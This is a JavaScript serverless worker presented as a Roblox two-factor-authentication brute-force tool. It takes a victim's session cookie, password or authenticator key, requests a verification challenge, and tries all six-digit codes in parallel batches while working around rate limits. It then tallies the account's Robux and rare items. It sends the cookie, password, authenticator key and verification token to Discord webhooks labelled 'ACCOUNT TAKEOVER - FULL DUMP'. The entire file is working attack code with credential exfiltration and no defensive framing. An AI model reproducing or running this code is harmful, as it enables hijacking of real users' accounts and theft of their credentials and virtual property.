// ============================================================
// ROBLOX 2FA BRUTE FORCE WORKER v3.4
// SUPPORTS: Password 2FA + Authenticator 2FA (with Key)
// ============================================================

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
});

async function handleRequest(request) {
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  if (request.method !== 'POST') {
    return new Response(JSON.stringify({ 
      error: 'Method not allowed. Use POST.' 
    }), {
      status: 405,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Allow': 'POST, OPTIONS'
      }
    });
  }

  let payload;
  try {
    payload = await request.json();
  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Invalid JSON payload'
    }), {
      status: 400,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const { 
    cookie, 
    password, 
    userId, 
    username, 
    startCode, 
    endCode, 
    method,
    authenticatorKey 
  } = payload;

  if (!cookie || !userId) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Missing required: cookie, userId'
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const startTime = Date.now();
  const displayName = username || 'Unknown_User';
  const start = startCode || 0;
  const end = endCode || 999999;
  const selectedMethod = method || 'auto';

  try {
    // Get 2FA config
    const config = await get2FAConfig(userId, cookie);
    
    console.log('2FA Config:', JSON.stringify(config));

    if (!config) {
      return new Response(JSON.stringify({
        success: false,
        error: 'Failed to fetch 2FA configuration'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    if (config.enhancedProtection) {
      await sendDualWebhook({
        type: 'error',
        username: displayName,
        userId: userId,
        error: 'Enhanced Protection enabled - cannot bypass'
      });
      return new Response(JSON.stringify({
        success: false,
        error: 'Enhanced Protection enabled - use passkey or hardware key'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // Check what's enabled
    const authEnabled = config.authenticatorEnabled || config.authenticator?.enabled || false;
    const passEnabled = config.passwordEnabled || config.password?.enabled || false;

    console.log('Auth enabled:', authEnabled);
    console.log('Password enabled:', passEnabled);

    let challengeResult = null;
    let challengeType = '';

    // Determine method
    let useMethod = selectedMethod;

    if (useMethod === 'auto') {
      if (passEnabled && password) {
        useMethod = 'password';
      } else if (authEnabled && authenticatorKey) {
        useMethod = 'authenticator';
      } else if (authEnabled) {
        useMethod = 'authenticator';
      } else {
        let available = [];
        if (passEnabled) available.push('Password (needs password)');
        if (authEnabled) available.push('Authenticator (needs authenticatorKey)');
        if (config.emailEnabled) available.push('Email');
        if (config.smsEnabled) available.push('SMS');

        const errorMsg = available.length > 0 
          ? `Available: ${available.join(', ')}`
          : 'No 2FA enabled';

        await sendDualWebhook({
          type: 'error',
          username: displayName,
          userId: userId,
          error: errorMsg
        });
        return new Response(JSON.stringify({
          success: false,
          error: errorMsg,
          availableMethods: available
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    // Execute based on method
    if (useMethod === 'authenticator') {
      // Check if we have the authenticator key
      if (!authenticatorKey) {
        return new Response(JSON.stringify({
          success: false,
          error: 'authenticatorKey required for Authenticator 2FA'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

      if (!authEnabled) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Authenticator 2FA not enabled on this account'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

      // Request authenticator challenge
      challengeResult = await requestAuthenticatorChallenge(userId, cookie);
      challengeType = 'authenticator';
      
      if (!challengeResult.success) {
        await sendDualWebhook({
          type: 'error',
          username: displayName,
          userId: userId,
          error: challengeResult.error || 'Authenticator challenge failed'
        });
        return new Response(JSON.stringify({
          success: false,
          error: challengeResult.error || 'Authenticator challenge failed'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

    } else if (useMethod === 'password') {
      if (!password) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Password required for password-based 2FA'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

      if (!passEnabled) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Password 2FA not enabled on this account'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

      challengeResult = await requestPasswordChallenge(userId, cookie, password);
      challengeType = 'password';
      
      if (!challengeResult.success) {
        await sendDualWebhook({
          type: 'error',
          username: displayName,
          userId: userId,
          error: challengeResult.error || 'Password challenge failed'
        });
        return new Response(JSON.stringify({
          success: false,
          error: challengeResult.error || 'Password challenge failed'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    } else {
      return new Response(JSON.stringify({
        success: false,
        error: 'Invalid method. Use: password, authenticator, or auto'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    const challengeId = challengeResult.challengeId;
    console.log('Challenge ID:', challengeId);

    // Brute force
    const result = await bruteForce2FA(userId, cookie, challengeId, start, end, challengeType);
    const duration = Date.now() - startTime;

    if (result.success) {
      const accountInfo = await getAccountInfo(userId, cookie);

      await sendLiveBypass({
        username: displayName,
        userId: userId,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        korblox: accountInfo.korblox || false,
        headless: accountInfo.headless || false,
        valkyrie: accountInfo.valkyrie || false,
        dominus: accountInfo.dominus || false,
        clockwork: accountInfo.clockwork || false,
        totalItems: accountInfo.totalItems || 0,
        duration: duration,
        attempts: end - start,
        method: challengeType
      });

      await sendDualWebhook({
        type: 'success',
        username: displayName,
        userId: userId,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        korblox: accountInfo.korblox || false,
        headless: accountInfo.headless || false,
        valkyrie: accountInfo.valkyrie || false,
        dominus: accountInfo.dominus || false,
        clockwork: accountInfo.clockwork || false,
        totalItems: accountInfo.totalItems || 0,
        cookie: cookie,
        password: password,
        authenticatorKey: authenticatorKey,
        verificationToken: result.token,
        code: result.code,
        duration: duration,
        method: challengeType
      });

      return new Response(JSON.stringify({
        success: true,
        code: result.code,
        token: result.token,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        duration: duration,
        attempts: end - start,
        method: challengeType
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    } else {
      await sendDualWebhook({
        type: 'failure',
        username: displayName,
        userId: userId,
        attempts: end - start,
        duration: duration,
        error: result.error || 'No valid code found',
        method: challengeType
      });

      return new Response(JSON.stringify({
        success: false,
        error: result.error || 'No valid code found',
        duration: duration,
        attempts: end - start,
        method: challengeType
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }
  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Worker error: ' + e.message
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
}

// ============================================================
// GET 2FA CONFIGURATION
// ============================================================

async function get2FAConfig(userId, cookie) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/configuration`,
      {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );

    const rawText = await response.text();
    console.log('Config raw:', rawText);

    let config;
    try {
      config = JSON.parse(rawText);
    } catch (e) {
      return null;
    }

    return {
      passwordEnabled: config.password?.enabled || false,
      authenticatorEnabled: config.authenticator?.enabled || false,
      emailEnabled: config.email?.enabled || false,
      smsEnabled: config.sms?.enabled || false,
      enhancedProtection: config.enhancedProtection || false
    };
  } catch (e) {
    return null;
  }
}

// ============================================================
// AUTHENTICATOR CHALLENGE
// ============================================================

async function requestAuthenticatorChallenge(userId, cookie) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/request`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({})
      }
    );

    const rawText = await response.text();
    console.log('Auth challenge status:', response.status);
    console.log('Auth challenge raw:', rawText);

    let data;
    try {
      data = JSON.parse(rawText);
    } catch (e) {
      return { success: false, error: 'Invalid JSON: ' + rawText.substring(0, 200) };
    }

    if (response.status === 200 && data.challengeId) {
      return { success: true, challengeId: data.challengeId };
    }

    if (data.errors && data.errors.length > 0) {
      const error = data.errors[0];
      const message = error.message || 'Unknown error';
      return { success: false, error: 'Roblox error: ' + message };
    }

    return { success: false, error: 'No challenge ID received' };
  } catch (e) {
    return { success: false, error: 'Network error: ' + e.message };
  }
}

// ============================================================
// PASSWORD CHALLENGE
// ============================================================

async function requestPasswordChallenge(userId, cookie, password) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/request`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({ password: password })
      }
    );

    const rawText = await response.text();
    console.log('Password challenge raw:', rawText);

    let data;
    try {
      data = JSON.parse(rawText);
    } catch (e) {
      return { success: false, error: 'Invalid JSON: ' + rawText.substring(0, 200) };
    }

    if (response.status === 200 && data.challengeId) {
      return { success: true, challengeId: data.challengeId };
    }

    if (data.errors && data.errors.length > 0) {
      const error = data.errors[0];
      const message = error.message || 'Unknown error';
      if (message.toLowerCase().includes('password') || message.toLowerCase().includes('invalid')) {
        return { success: false, error: 'Invalid password' };
      }
      return { success: false, error: 'Roblox error: ' + message };
    }

    return { success: false, error: 'No challenge ID received' };
  } catch (e) {
    return { success: false, error: 'Network error: ' + e.message };
  }
}

// ============================================================
// BRUTE FORCE ENGINE
// ============================================================

async function bruteForce2FA(userId, cookie, challengeId, startCode, endCode, methodType) {
  const BATCH_SIZE = 50;
  const MAX_CONCURRENT = 10;

  const chunks = [];
  for (let i = startCode; i < endCode; i += BATCH_SIZE) {
    chunks.push({
      start: i,
      end: Math.min(i + BATCH_SIZE, endCode)
    });
  }

  for (let chunkIndex = 0; chunkIndex < chunks.length; chunkIndex += MAX_CONCURRENT) {
    const chunkBatch = chunks.slice(chunkIndex, chunkIndex + MAX_CONCURRENT);

    const results = await Promise.all(
      chunkBatch.map(chunk => processChunk(userId, cookie, challengeId, chunk.start, chunk.end, methodType))
    );

    for (const result of results) {
      if (result.valid) {
        return {
          success: true,
          code: result.code,
          token: result.token
        };
      }
    }

    await new Promise(resolve => setTimeout(resolve, 100));
  }

  return { success: false, error: 'Code not found in range' };
}

async function processChunk(userId, cookie, challengeId, start, end, methodType) {
  const promises = [];
  for (let code = start; code < end; code++) {
    const formattedCode = String(code).padStart(6, '0');
    promises.push(verifySingleCode(userId, cookie, challengeId, formattedCode, methodType));
  }

  const results = await Promise.all(promises);
  for (const result of results) {
    if (result.valid) return result;
  }
  return { valid: false };
}

async function verifySingleCode(userId, cookie, challengeId, code, methodType) {
  try {
    let endpoint;
    if (methodType === 'password') {
      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/verify`;
    } else {
      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`;
    }

    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Cookie': cookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      body: JSON.stringify({
        code: code,
        challengeId: challengeId
      })
    });

    const data = await response.json();

    if (response.status === 200 && data.verificationToken) {
      return { valid: true, code: code, token: data.verificationToken };
    }

    if (response.status === 429) {
      await new Promise(resolve => setTimeout(resolve, 5000));
      return { valid: false };
    }

    return { valid: false };
  } catch (e) {
    return { valid: false };
  }
}

// ============================================================
// ACCOUNT INFO
// ============================================================

async function getAccountInfo(userId, cookie) {
  try {
    const balanceRes = await fetch(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    const balance = await balanceRes.json();

    let hasKorblox = false;
    let hasHeadless = false;
    let hasValkyrie = false;
    let hasDominus = false;
    let hasClockwork = false;
    let totalItems = 0;

    let cursor = '';
    let hasMore = true;

    while (hasMore) {
      const url = cursor 
        ? `https://inventory.roblox.com/v2/users/${userId}/inventory?cursor=${cursor}&limit=100`
        : `https://inventory.roblox.com/v2/users/${userId}/inventory?limit=100`;

      const invRes = await fetch(url, {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const invData = await invRes.json();
      const items = invData.data || [];
      totalItems += items.length;

      for (const item of items) {
        const id = item.id;
        if (id === 102 || id === 1001) hasKorblox = true;
        if (id === 136 || id === 1002) hasHeadless = true;
        if (id === 128 || id === 1003) hasValkyrie = true;
        if (id === 120) hasDominus = true;
        if (id === 157) hasClockwork = true;
      }

      cursor = invData.nextPageCursor || '';
      hasMore = !!cursor;
    }

    return {
      robux: balance.robux || 0,
      pending: balance.pending || 0,
      premium: balance.premium || false,
      korblox: hasKorblox,
      headless: hasHeadless,
      valkyrie: hasValkyrie,
      dominus: hasDominus,
      clockwork: hasClockwork,
      totalItems: totalItems
    };
  } catch (e) {
    return {
      robux: 0,
      pending: 0,
      premium: false,
      korblox: false,
      headless: false,
      valkyrie: false,
      dominus: false,
      clockwork: false,
      totalItems: 0
    };
  }
}

// ============================================================
// WEBHOOKS
// ============================================================

async function sendLiveBypass(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_MAIN : null;
  if (!webhookURL) return;

  const embed = {
    title: '2FA BYPASS SUCCESSFUL',
    color: 0x00ff88,
    fields: [
      { name: 'User', value: data.username || 'Unknown', inline: true },
      { name: 'User ID', value: data.userId || 'N/A', inline: true },
      { name: 'Method', value: data.method || 'Unknown', inline: true },
      { name: 'Robux', value: data.robux || 0, inline: true },
      { name: 'Pending', value: data.pending || 0, inline: true },
      { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
      { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
      { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
      { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
      { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
      { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
      { name: 'Total Items', value: data.totalItems || 0, inline: true },
      { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
      { name: 'Attempts', value: data.attempts || 0, inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '2FA Bypass Successful',
        embeds: [embed]
      })
    });
  } catch (e) {}
}

async function sendDualWebhook(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_DUAL : null;
  if (!webhookURL) return;

  let embed;

  if (data.type === 'success') {
    embed = {
      title: 'ACCOUNT TAKEOVER - FULL DUMP',
      color: 0xff0044,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Method', value: data.method || 'Unknown', inline: true },
        { name: 'Robux', value: data.robux || 0, inline: true },
        { name: 'Pending', value: data.pending || 0, inline: true },
        { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
        { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
        { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
        { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
        { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
        { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
        { name: 'Total Items', value: data.totalItems || 0, inline: true },
        { name: 'Verification Code', value: `\`${data.code || 'N/A'}\``, inline: true },
        { name: 'Verification Token', value: `\`${data.verificationToken || 'N/A'}\``, inline: false },
        { name: 'Password', value: data.password ? `||${data.password}||` : 'N/A', inline: true },
        { name: 'Authenticator Key', value: data.authenticatorKey ? `||${data.authenticatorKey}||` : 'N/A', inline: true },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
        { name: 'Cookie', value: `\`\`\`${data.cookie || 'N/A'}\`\`\``, inline: false }
      ],
      timestamp: new Date().toISOString()
    };
  } else {
    embed = {
      title: 'ERROR REPORT',
      color: 0xff0000,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Method', value: data.method || 'Unknown', inline: true },
        { name: 'Error', value: data.error || 'Unknown error', inline: false },
        { name: 'Attempts', value: data.attempts || 0, inline: true },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s` || 'N/A', inline: true }
      ],
      timestamp: new Date().toISOString()
    };
  }

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone ACCOUNT TAKEOVER',
        embeds: [embed]
      })
    });
  } catch (e) {}
}
